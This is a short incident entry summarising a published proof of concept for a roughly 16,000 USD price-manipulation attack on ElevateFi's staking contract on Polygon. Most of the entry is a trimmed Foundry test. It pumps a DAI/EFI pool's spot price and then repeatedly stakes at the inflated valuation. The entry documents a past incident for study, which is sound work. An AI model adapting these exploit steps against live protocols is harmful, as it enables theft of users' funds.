# [?] ElevateFi - Reserve Price Manipulation

## Summary
Severity: Unknown
Chain: Polygon
Component: ElevateFi
Published: 2026-05-19
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-05/ElevateFi_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~16,000 USD

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 87_132_216;
        vm.createSelectFork("polygon", forkBlock);
        vm.roll(87_132_217);
        vm.warp(1_779_221_088);

        fundingToken = EFI;
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(ELEVATE_STAKING_PROXY, "ElevateFi staking proxy");
        vm.label(EFI, "EFI");
        vm.label(DAI, "DAI");
        vm.label(DAI_EFI_PAIR, "DAI/EFI pair");
    }

    function testExploit() public balanceLog {
        uint256 efiBefore = IERC20(EFI).balanceOf(ATTACKER);

        // The real tx got this buying power from nested DAI flash loans. Here it is setup capital so the PoC
        // focuses on ElevateFi's vulnerable reserve-price dependency.
        uint256 daiSeed = 1_360_000 ether;
        deal(DAI, ATTACKER, daiSeed);

        vm.startPrank(ATTACKER, ATTACKER);

        // step 1: pump the DAI/EFI pair spot price used by ElevateFi's getPriceUSD().
        buyEfiWithAllDai();

        // step 2: create the same package-7 stakes while the reserve-derived EFI price is inflated.
        uint256 stakeCount = 100;
        for (uint256 i = 0; i < stakeCount; ++i) {
            IElevateStaking(ELEVATE_STAKING_PROXY).stakeEFI(7);
        }
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-05/ElevateFi_exp.sol_
